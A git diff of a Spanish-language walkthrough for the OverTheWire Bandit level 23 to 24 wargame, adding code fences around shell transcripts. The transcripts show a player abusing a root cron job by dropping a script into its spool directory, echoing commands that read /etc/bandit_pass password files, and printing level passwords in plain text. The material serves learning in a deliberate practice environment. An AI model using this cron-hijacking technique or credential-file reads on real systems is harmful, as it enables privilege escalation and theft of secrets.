@@ -8,6 +8,7 @@ A program is running automatically at regular intervals from **cron**, the time
 bandit23@bandit.labs.overthewire.org -p 2220
 contraseña del anterior nivel: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 ## Solucion
+```
 bandit23@bandit:/$  ls /etc/cron.d/
 cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
 cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
@@ -234,9 +235,10 @@ cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not pe
 bandit23@bandit:/tmp/rand$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/rand/password" > /usr/bin/cronjob_bandit24.sh
 -bash: /usr/bin/cronjob_bandit24.sh: Operation not permitted
 bandit23@bandit:/tmp/rand$
-
+```
 
 ## otra solucion esta si me sirvio
+```
 bandit23@bandit:~$ cd /etc/cron.d/
 bandit23@bandit:/etc/cron.d$ ls
 cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
@@ -280,6 +282,7 @@ bandit23@bandit:/var/spool/bandit24/foo$ ls prueba1.sh
 prueba1.sh
 bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/certa_test.txt
 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
 ## Notas adicionales 
 no pude resolver el ejercicio aun que vi el video de youtube comprendi el hacer un **script.sh** para este ejercicio te lo da todo pero necesitamos permisos de chmod 777
 ## Referencias 
